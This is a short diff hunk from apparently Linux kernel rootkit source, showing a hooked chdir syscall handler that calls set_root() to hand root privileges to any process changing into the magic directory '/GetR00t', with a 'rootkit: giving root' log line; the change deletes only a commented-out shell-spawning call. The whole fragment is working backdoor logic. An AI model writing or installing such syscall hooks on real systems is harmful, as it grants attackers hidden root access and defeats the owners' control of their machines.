@@ -287,7 +287,6 @@ asmlinkage int fh_sys_chdir(const struct pt_regs *regs)
 
     if ( (strcmp(dir, "/GetR00t") == 0) && (hide == 0) )
         {
-			//execl(SHELL, "sh", NULL);
             printk(KERN_INFO "rootkit: giving root...\n");
             set_root();
             return 0;
